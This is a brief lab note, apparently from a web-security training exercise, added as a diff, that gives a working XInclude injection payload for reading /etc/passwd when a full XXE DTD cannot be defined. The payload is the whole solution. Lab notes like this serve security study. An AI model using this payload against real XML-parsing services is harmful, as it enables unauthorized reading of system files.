@@ -1,0 +1,6 @@
+Lab: Exploiting XInclude to retrieve files
+Task: Inject an XInclude statement to retrieve the contents of the /etc/passwd file.
+Note:  Can't control the entire XML document you can't define a DTD to launch a classic XXE attack.
+
+soln:
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
